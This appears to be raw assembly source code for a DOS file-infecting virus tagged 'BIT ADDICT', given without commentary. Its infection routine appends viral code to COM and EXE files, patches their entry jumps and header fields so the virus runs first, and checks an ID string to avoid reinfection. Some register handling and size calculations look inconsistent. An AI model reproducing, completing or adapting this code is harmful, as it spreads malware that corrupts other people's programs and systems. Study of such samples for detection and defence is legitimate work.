jmpc    macro   Dest
	local   Skip

	jnc     Skip
	jmp     Dest
Skip:
	endm

jmpnc   macro   Dest
	local   Skip

	jc      Skip
	jmp     Dest
Skip:
	endm

jmpe    macro   Dest
	local   Skip

	jnz     Skip
	jmp     Dest
Skip:
	endm

jmpne   macro   Dest
	local   Skip

	jz      Skip
	jmp     Dest
Skip:
	endm

code segment
	assume  cs:code,ds:code,es:code
	org     0

ID              db      'BIT ADDICT'
ID_Length       equ     $-offset ID

SavedCode       equ     this byte
OldIP           dw      0
OldCS           dw      0
OldSP           dw      0
OldSS           dw      0
		dw      0

Begin:  mov     ax,4c00h
	int     21h

ComHeader:
	mov     ax,cs
	add     ax,0100h
OldPrgSize      equ     this word-2
	push    ax
	xor     ax,ax
	push    ax
	retf

Infect: push    ax
	push    bx
	push    cx
	push    cx
	push    si
	push    di
	push    bp
	push    ds
	push    es
	mov     ax,3d02h
	int     21h
	jmpc    Close
	push    cs
	pop     ds
	push    cs
	pop     es
	mov     bx,ax
	mov     ah,3fh
	mov     cx,HeaderLength
	lea     dx,Header
	int     21h
	jmpc    Close
	cmp     ax,HeaderLength
	jne     ComFile
	cmp     Signature,5a4dh
	je      ComChk
ExeChk: mov     ax,ExeCS
	add     ax,HeaderSize
	mov     dx,10h
	mul     dx
	mov     cx,dx
	mov     dx,ax
	jmp     Check
ComChk: xor     cx,cx
	mov     dx,NearJump
	sub     dx,offset Begin-3
	jb      ComFile
Check:  mov     ax,4200h
	int     21h
	mov     ah,3fh
	mov     cx,ID_Length
	lea     dx,ID_Check
	int     21h
	lea     si,ID_Check
	lea     di,ID
	mov     cx,ID_Length
	repe    cmpsb
	jmpe    Close
	cmp     Signature,5a4dh
	je      ExeFile
ComFile:mov     si,offset Header
	mov     di,offset SavedCode
	mov     cx,0ah
	rep     movsb
	mov     ax,4202h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     cx,10h
	div     cx
	or      dx,dx
	je      Ok1
	push    ax
	mov     ah,40h
	mov     cx,10h
	sub     cx,dx
	xor     dx,dx
	int     21h
	pop     ax
	jc      Close
	inc     ax
Ok1:    add     ax,10h
	mov     OldPrgSize,ax
	mov     ah,40h
	mov     cx,CodeSize1
	xor     dx,dx
	int     21h
	jmpc    Close
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	jmpc    Close
	mov     ah,40h
	mov     cx,10
	mov     dx,offset ComHeader
	int     21h
	jmp     Close
ExeFile:mov     ax,ExeIP
	mov     OldIP,ax
	mov     ax,ExeCS
	mov     OldCS,ax
	mov     ax,ExeSP
	mov     OldSP,ax
	mov     ax,ExeSS
	mov     OldSS,ax
	mov     ax,PageCount
	dec     ax
	mov     cx,200h
	mul     cx
	add     ax,PartPage
	adc     dx,0
	mov     cx,dx
	mov     dx,ax
	mov     ax,4200h
	int     21h
	mov     cx,10h
	div     cx
	or      dx,dx
	je      Ok2
	push    ax
	mov     ah,40h
	mov     cx,10h
	sub     cx,dx
	xor     dx,dx
	int     21h
	pop     ax
	jc      Close
	inc     ax
Ok2:    sub     ax,HeaderSize
	mov     ExeCS,ax
	mov     ExeIP,offset Begin
	add     ax,CodeSizePara2
	mov     ExeSS,ax
	mov     ExeSP,200h
	mov     ax,MinMem
	cmp     ax,20h+CodeSizePara2-CodeSizePara1
	jae     Ok3
	mov     ax,20h
Ok3:    mov     MinMem,ax
	mov     ax,PartPage
	add     ax,offset CodeSize2
	xor     dx,dx
	mov     cx,200h
	div     cx
	add     PageCount,ax
	mov     PartPage,dx
	mov     ah,40h
	mov     cx,offset CodeSize1
	xor     dx,dx
	int     21h
	jc      Close
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	jc      Close
	mov     ah,40h
	mov     cx,HeaderLength
	mov     dx,offset Header
	int     21h
Close:  mov     ah,3eh
	int     21h
	pop     es
	pop     ds
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	iret

CodeSize1       equ     $
CodeSizePara1   equ     ($+0fh) / 4

Header          dw      14h dup(?)
NearJump        equ     Header[1h]              ; Com file

Signature       equ     Header[0h]              ; Exe file
PartPage        equ     Header[2h]
PageCount       equ     Header[4h]
ReloCount       equ     Header[6h]
HeaderSize      equ     Header[8h]
MinMem          equ     Header[0ah]
MaxMem          equ     Header[0ch]
ExeSS           equ     Header[0eh]
ExeSP           equ     Header[10h]
ChkSum          equ     Header[12h]
ExeIP           equ     Header[14h]
ExeCS           equ     Header[16h]
TablOfs         equ     Header[18h]
OverlayNr       equ     Header[1ah]
HeaderLength    equ     1ch

ID_Check        db      ID_Length dup(?)

CodeSize2       equ     $
CodeSizePara2   equ     ($+0fh) shr 4

code ends

end
